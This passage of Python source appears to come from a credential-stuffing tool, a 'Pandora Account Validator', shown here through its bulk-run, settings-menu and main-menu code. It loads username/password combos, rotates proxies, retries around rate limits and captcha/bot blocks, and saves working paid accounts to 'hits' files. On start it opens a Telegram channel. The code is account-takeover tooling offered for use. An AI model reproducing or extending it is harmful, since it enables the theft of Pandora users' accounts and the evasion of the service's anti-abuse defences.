    _eyelifter_folder = os.path.join(RESULTS_FOLDER, f"Session_{ts}_{rand_tag}")
    os.makedirs(_eyelifter_folder, exist_ok=True)

    _eyelifter_hits_f = open(os.path.join(_eyelifter_folder, "pandora_hits.txt"), "w", encoding="utf-8")
    _eyelifter_free_f = open(os.path.join(_eyelifter_folder, "pandora_free.txt"), "w", encoding="utf-8")
    _eyelifter_bad_f = open(os.path.join(_eyelifter_folder, "pandora_bad.txt"), "w", encoding="utf-8")
    _eyelifter_err_f = open(os.path.join(_eyelifter_folder, "pandora_errors.txt"), "w", encoding="utf-8")

    header = (f"# Pandora Checker - {datetime.now().isoformat()}\n"
              f"# Checked by {AUTHOR_TAG}\n"
              f"# Seal: {CREDIT_SEAL}\n\n")
    for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
        fh.write(header)

    _eyelifter_total = len(combos)
    Eyelifter_log("📊", "INFO", "FILE", f"loaded {_eyelifter_total}")
    Eyelifter_log("⚙️", "INFO", "CONFIG",
                  f"threads:{CONFIG['threads']} timeout:{CONFIG['timeout']}s "
                  f"retries:{CONFIG['retries']} gap:{CONFIG['combo_delay']}s")

    if proxies:
        working = Eyelifter_get_working_proxies(proxies)
        if not working:
            Eyelifter_log("❌", "ERROR", "PROXY", "no working proxies — aborting")
            for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
                try:
                    fh.close()
                except Exception:
                    pass
            input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
            return
        _eyelifter_pool = working
        _eyelifter_bad = set()
    else:
        _eyelifter_pool = []
        _eyelifter_bad = set()
        Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

    _eyelifter_stop.clear()
    try:
        asyncio.run(Eyelifter_bulk_runner(combos))
    except KeyboardInterrupt:
        _eyelifter_stop.set()
        Eyelifter_log("🛑", "WARN", "STOP", "stopping...")
    except Exception as e:
        Eyelifter_log("❌", "ERROR", "RUN", f"{type(e).__name__}: {str(e)[:120]}")
    finally:
        for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
            try:
                fh.close()
            except Exception:
                pass

    for base, key in (
        ("pandora_hits.txt", "hits"), ("pandora_free.txt", "free"),
        ("pandora_bad.txt", "bad"), ("pandora_errors.txt", "errors"),
    ):
        old = os.path.join(_eyelifter_folder, base)
        new = os.path.join(_eyelifter_folder, base.replace(".txt", f"_{_eyelifter_stats[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    Eyelifter_log("💾", "INFO", "SAVE", f"results → {_eyelifter_folder}")

    Eyelifter_divider()
    el = time.time() - _eyelifter_start
    Eyelifter_summary([
        ("Total", _eyelifter_total),
        ("Subscribers (paid)", _eyelifter_stats["hits"]),
        ("Free", _eyelifter_stats["free"]),
        ("Bad creds", _eyelifter_stats["bad"]),
        ("Errors", _eyelifter_stats["errors"]),
        ("Rate limited", _eyelifter_stats["rate_limited"]),
        ("Captcha/PX", _eyelifter_stats["captcha"]),
        ("Proxy fails", _eyelifter_stats["proxy_fails"]),
        ("Retries", _eyelifter_stats["retries"]),
        ("Time", f"{el:.1f}s"),
        ("Folder", _eyelifter_folder),
    ])

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_settings_menu():
    Eyelifter_verify("settings")
    global DEBUG, REQ_TIMEOUT, RATE_LIMIT_BACKOFF, MAX_RATE_LIMIT_RETRIES
    Eyelifter_section("SETTINGS")
    print(Eyelifter_color("96", "Current:"))
    print(f"  [1]  Threads:            {CONFIG['threads']}")
    print(f"  [2]  Timeout:            {CONFIG['timeout']}s")
    print(f"  [3]  Retries:            {CONFIG['retries']}")
    print(f"  [4]  Retry Delay:        {CONFIG['retry_delay']}s")
    print(f"  [5]  Combo Delay:        {CONFIG['combo_delay']}s")
    print(f"  [6]  Rate Limit Backoff: {CONFIG['rate_limit_backoff']}s")
    print(f"  [7]  Max RL Retries:     {CONFIG['max_rate_limit_retries']}")
    print(f"  [8]  Proxy File:         {CONFIG['proxies_file']}")
    print(f"  [9]  Skip Proxy Test:    {CONFIG['skip_proxy_test']}")
    print(f"  [10] Debug:              {CONFIG['debug']}")
    print(f"  [11] Back")

    ch = input(f"{Eyelifter_color('96', '[*] Select: ')}").strip()
    changed = False

    try:
        if ch == "1":
            CONFIG["threads"] = max(1, min(50, int(input("Threads (1-50): "))))
            _loader.settings["threads"] = CONFIG["threads"]
            changed = True
        elif ch == "2":
            CONFIG["timeout"] = max(5, min(300, int(input("Timeout (5-300): "))))
            _loader.settings["timeout"] = CONFIG["timeout"]
            REQ_TIMEOUT = CONFIG["timeout"]
            changed = True
        elif ch == "3":
            CONFIG["retries"] = max(0, min(10, int(input("Retries (0-10): "))))
            _loader.settings["retries"] = CONFIG["retries"]
            changed = True
        elif ch == "4":
            CONFIG["retry_delay"] = max(0.0, min(60.0, float(input("Retry delay (s): "))))
            _loader.settings["retry_delay"] = CONFIG["retry_delay"]
            changed = True
        elif ch == "5":
            CONFIG["combo_delay"] = max(0.0, min(60.0, float(input("Combo delay (s): "))))
            _loader.settings["combo_delay"] = CONFIG["combo_delay"]
            changed = True
        elif ch == "6":
            CONFIG["rate_limit_backoff"] = max(1, min(600, int(input("Backoff (1-600): "))))
            _loader.settings["rate_limit_backoff"] = CONFIG["rate_limit_backoff"]
            RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
            changed = True
        elif ch == "7":
            CONFIG["max_rate_limit_retries"] = max(0, min(20, int(input("Max RL retries (0-20): "))))
            _loader.settings["max_rate_limit_retries"] = CONFIG["max_rate_limit_retries"]
            MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]
            changed = True
        elif ch == "8":
            v = input("Proxies file path: ").strip()
            if v:
                CONFIG["proxies_file"] = v
                _loader.settings["proxies_file"] = v
                changed = True
        elif ch == "9":
            CONFIG["skip_proxy_test"] = not CONFIG["skip_proxy_test"]
            _loader.settings["skip_proxy_test"] = CONFIG["skip_proxy_test"]
            changed = True
        elif ch == "10":
            CONFIG["debug"] = not CONFIG["debug"]
            _loader.settings["debug"] = CONFIG["debug"]
            DEBUG = CONFIG["debug"]
            changed = True
        elif ch == "11":
            return
    except (ValueError, TypeError):
        Eyelifter_log("❌", "ERROR", "CONFIG", "invalid")
        return

    if changed:
        try:
            _loader.Eyelifter_save()
            Eyelifter_log("💾", "INFO", "CONFIG", "saved")
        except Exception as e:
            Eyelifter_log("⚠️", "WARN", "CONFIG", f"save failed: {e}")


def Eyelifter_main():
    Eyelifter_verify("main")

    def _delayed_open():
        time.sleep(0.4)
        Eyelifter_open_url("https://t.me/darkhuchannel")

    threading.Thread(target=_delayed_open, daemon=True).start()
    Eyelifter_banner(TOOL_NAME, "Pandora Account Validator")
    proxies = Eyelifter_load_proxies()

    while True:
        Eyelifter_verify("menu")
        Eyelifter_section("MAIN MENU")
        if proxies:
            Eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

        print("[1] Single check")
        print("[2] Bulk check from file")
        print("[3] Settings")
        print("[4] Exit")

        choice = input(f"{Eyelifter_color('93', '[*] Select: ')}").strip()

        if choice == "1":
            Eyelifter_single_check(proxies)
        elif choice == "2":
            _eyelifter_stop.clear()
            Eyelifter_bulk_check(proxies)
        elif choice == "3":
            Eyelifter_settings_menu()
            proxies = Eyelifter_load_proxies()
        elif choice == "4":
            print("Exiting...")
            break
        else:
            Eyelifter_log("❌", "ERROR", "INPUT", "invalid choice")


if __name__ == "__main__":
    while True:
        try:
            Eyelifter_main()
            break
        except SystemExit:
            raise
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(1)
        except Exception as e:
            print(f"[FATAL] {type(e).__name__}: {e}")
            print("restarting menu in 3s...")
            time.sleep(3)